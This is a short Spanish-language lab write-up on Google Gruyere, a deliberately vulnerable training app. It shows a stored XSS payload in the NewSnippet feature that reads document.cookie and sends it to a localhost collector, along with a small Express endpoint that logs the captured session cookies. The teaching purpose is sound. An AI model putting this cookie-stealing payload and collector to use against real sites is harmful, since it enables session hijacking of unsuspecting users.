# Google Gruyere

**NewSnippet:**
Podemos incluir **html** en el texto, no verifican que es lo que mandamos, así que se puede inyectar código.

**Inyectar script:**
Podemos inyectar un scrip gracias a subir un archivo en la página de *Upload*, e inyectarlo en *NewSnippeet* gracias a un enlace de html, asi redirigimos al usuario a dónde queremos.

Por otra parte en esta práctica hemos capturado las cookies del usuario de gruyere, con la siguiente inyección de xss:

```html
<script>
    //Se obtiene las cookies 
    const cookies = document.cookie

    //Enviar cookies al servidor
    fetch(`http://localhost:3000/grab?cookies=${encodeURIComponent(cookies)}`)
    //{encodeURIComponent(cookies)} esto evita problemas con caracteres especiales
    //La solicitud se envia a /grab como una solicitud GET
    .then(response => response.text())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
    
</script>
```

Apuntamos a nuestro localhost para realizar esta captura en un entorno protegido.

**Nuestro backend:**
Solo nos hace falta un endpoint con método `GET` para capturar los datos, y poder guardarlos si queremos.

```js
app.get('/grab', (req, res) => {
    //Recibir las cookies que  nos manda el usuario
    const cookies = req.query.cookies
    console.log("Cookies recibidas:", cookies);
})
```

Y en nuestra consola se vería tal que así:

```bash
Cookies recibidas: GRUYERE=45876930|usuario||author; GRUYERE_ID=530531804286574254545111292069532189297
```